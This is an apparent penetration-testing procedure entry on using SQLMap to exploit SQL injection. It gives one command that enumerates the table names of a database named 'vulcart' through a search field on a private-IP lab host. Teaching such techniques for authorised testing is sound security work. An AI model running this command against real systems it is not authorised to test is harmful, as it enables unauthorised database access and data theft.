---
id: 751dba5d-8314-477c-93b7-b6b407c74e9a
name: Using SQLMap to Dump Table Names
type: procedure
verified: true
submitted: true
created_at: '2020-08-19T17:42:16.529457+00:00'
updated_at: '2023-05-26T01:12:45.532780+00:00'
platforms:
- Web
tags:
- '[[owasp]]'
- '[[owasp top 10]]'
- '[[sqli]]'
- '[[SQL Injection]]'
- '[[Web Applications]]'
commands:
- '[[SQLMap Command to Dump Table Names From Database]]'
---

# Using SQLMap to Dump Table Names

**Status**: ✓ Verified

## Summary

SQLMap is an automated SQL Injection exploitation tool. This can be used to insert the SQL injection payloads through the application input fields. --D is used to specify the database name and --tables to dump the table names 

## Description

# Description

SQLMap is an automated SQL Injection exploitation tool. This can be used to insert the SQL injection payloads through the application input fields.

*--D is used to specify the database name and --tables to dump the table names*

# Procedure

 1. Use the below SQLMap command to dump the table names from the database. 

**Command** ([[SQLMap Command to Dump Table Names From Database]]):

```bash
sqlmap -u 'http://192.168.43.68/vcart/search.php?term=' -D vulcart --tables
```

## Platforms

- Web

## Commands Used

- [[SQLMap Command to Dump Table Names From Database]]

## Tags

- [[owasp]]
- [[owasp top 10]]
- [[sqli]]
- [[SQL Injection]]
- [[Web Applications]]
